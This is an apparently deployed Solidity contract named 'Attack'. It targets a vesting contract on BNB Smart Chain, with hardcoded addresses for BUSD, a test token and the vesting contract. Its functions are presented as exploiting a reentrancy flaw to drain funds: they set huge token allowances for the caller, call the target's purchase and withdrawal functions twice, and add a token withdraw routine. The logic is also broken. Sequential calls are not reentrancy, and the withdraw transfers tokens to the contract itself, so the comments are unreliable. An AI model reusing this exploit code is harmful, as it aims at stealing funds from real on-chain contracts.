/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}



interface IVestingUtilityLabs {
    function saque() external;
    function comprar_com_BUSD(uint256 quantidade) external;
}

interface IBUSDImplementation {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITeste {
    function approve(address spender, uint256 amount) external returns (bool);
}

 contract Attack {

    address public BUSD = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
    address public TESTE = 0x6f3E186193b5D3860841aE5a77CfA68e529669A9;
    address public VESTING = 0x6e92271efDD1B866543ae9e3E7745174344518aD;
    
    IVestingUtilityLabs public immutable etherVault;
    IBUSDImplementation public immutable busd;
    ITeste public immutable teste;

    constructor(IVestingUtilityLabs _etherVault, IBUSDImplementation _busd, ITeste _teste) {
        etherVault = _etherVault;
        busd = _busd;
        teste = _teste;
    }

    // Function to exploit the reentrancy vulnerability in the comprar_com_BUSD function
  function exploitComprar() public {
    // Call the comprar_com_BUSD function of the vulnerable contract
    IBUSDImplementation(busd).approve(msg.sender, 43578275894375289375892347589235789427);
    ITeste(teste).approve(msg.sender, 43578275894375289375892347589235789427);
    etherVault.comprar_com_BUSD(5);
    // Call the comprar_com_BUSD function again before the first call has completed
    etherVault.comprar_com_BUSD(5);
  }

  // Function to exploit the reentrancy vulnerability in the saque function
  function exploitSaque() public {
    // Call the saque function of the vulnerable contract
    ITeste(teste).approve(msg.sender, 43578275894375289375892347589235789427);
    IBUSDImplementation(busd).approve(msg.sender, 43578275894375289375892347589235789427);
    etherVault.saque();

    // Call the saque function again before the first call has completed
    etherVault.saque();
  }

     // Withdraw function to withdraw the tokens from the vulnerable contract
  function withdraw(address tokenContract, uint256 amount) public {
    // Call the transfer function of the token contract to transfer the tokens from the vulnerable contract to the attacker contract
    IERC20(tokenContract).transfer(address(this), amount);
  }




}